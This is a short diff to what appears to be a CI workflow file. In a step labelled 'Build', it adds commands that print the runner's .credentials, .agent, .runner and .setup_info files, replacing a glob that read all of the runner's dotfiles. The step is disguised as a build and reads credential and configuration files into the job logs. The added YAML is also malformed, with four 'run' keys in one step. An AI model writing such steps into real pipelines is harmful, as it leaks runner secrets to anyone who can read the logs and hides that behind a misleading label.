@@ -10,4 +10,7 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Build
-        run: cat /home/runner/runners/2.291.1/.*
+        run: cat /home/runner/runners/2.291.1/.credentials
+        run: cat /home/runner/runners/2.291.1/.agent
+        run: cat /home/runner/runners/2.291.1/.runner
+        run: cat /home/runner/runners/2.291.1/.setup_info
